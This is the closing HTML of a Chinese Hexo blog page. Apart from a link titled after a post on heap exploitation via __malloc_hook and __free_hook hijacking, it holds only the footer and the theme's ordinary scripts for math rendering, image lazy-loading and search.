title="堆入门-__malloc_hook和__free_hook劫持原理">堆入门-__malloc_hook和__free_hook劫持原理</a><time datetime="2025-03-10T13:44:38.000Z" title="发表于 2025-03-10 21:44:38">2025-03-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By Zechariah</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [['$', '$'], ['\\(', '\\)']],
      tags: 'ams'
    },
    chtml: {
      scale: 1.1
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, '']
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typesetPromise()
}</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div>
        <style>
            [bg-lazy] {
                background-image: none !important;
                background-color: #eee !important;
            }
        </style>
        <script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(r){r.imageLazyLoadSetting.processImages=t;var e=r.imageLazyLoadSetting.isSPA,n=r.imageLazyLoadSetting.preloadRatio||1,c=a();function a(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){e&&(c=a());for(var t,o=0;o<c.length;o++)0<=(t=(t=c[o]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(r.innerHeight*n||document.documentElement.clientHeight*n)&&function(){var t,e,n,a,i=c[o];e=function(){c=c.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,a=t.getAttribute("data-original"),n.onload=function(){t.src=a,t.removeAttribute("data-original"),e&&e()},t.src!==a&&(n.src=a))}()}function i(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",i),r.addEventListener("resize",i),r.addEventListener("orientationchange",i)}(this);</script></body></html>